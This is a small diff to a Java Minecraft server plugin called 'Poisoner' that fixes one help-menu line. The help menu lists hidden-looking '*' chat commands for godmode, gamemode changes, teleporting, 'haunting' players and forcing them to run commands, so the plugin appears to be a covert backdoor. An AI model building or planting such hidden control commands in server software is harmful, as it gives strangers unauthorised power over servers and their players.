@@ -496,7 +496,7 @@ public class Main extends JavaPlugin implements Listener {
 			  p.sendMessage("\2476[Poisoner] \247f*gm1 [player] | Sets you or another player in creative mode.");
 			  p.sendMessage("\2476[Poisoner] \247f*gm2 [player] | Sets you or another player in adventure mode.");
 			  p.sendMessage("\2476[Poisoner] \247f*god | Sets yourself on godmode.");
-			  p.sendMessage("\2476[Poisoner] \247f*god [player] | Heals yourself or another player.");
+			  p.sendMessage("\2476[Poisoner] \247f*heal [player] | Heals yourself or another player.");
 			  p.sendMessage("\2476[Poisoner] \247f*tp <source_player> <destination_player> | Teleports source_player to destination_player.");
 			  p.sendMessage("\2476[Poisoner] \247f*haunt <player> | Plays creepy sounds at a specific player.");
 			  p.sendMessage("\2476[Poisoner] \247f*sudo <player> <chat or /command> | Forces a player to execute a command or write into the chat.");
